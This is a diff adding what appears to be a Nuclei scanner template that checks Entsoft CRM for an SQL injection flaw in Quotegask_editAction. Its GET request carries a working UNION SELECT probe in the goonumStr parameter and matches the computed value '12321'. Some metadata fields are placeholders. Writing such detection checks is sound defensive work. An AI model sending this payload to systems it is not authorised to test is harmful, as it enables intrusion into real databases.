@@ -1,0 +1,18 @@
+id: entsoft-Quotegask-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 浙大恩特客户资源管理系统-Quotegask_editAction存在SQL注入漏洞
+  reference:
+    - https://github.com/MrWQ/vulnerability-paper/blob/df6ce0ac5fff0f1838e11eeb8e4c7c11c3744493/bugs/%E4%BA%92%E8%81%94%E7%BD%91%E5%85%AC%E5%BC%80%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86%20202309-202406.md?plain=1#L3706
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/entsoft/Quotegask_editAction.entweb;.js?goonumStr=1')+UNION+ALL+SELECT+111*111--+&method=goonumIsExist"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '12321'
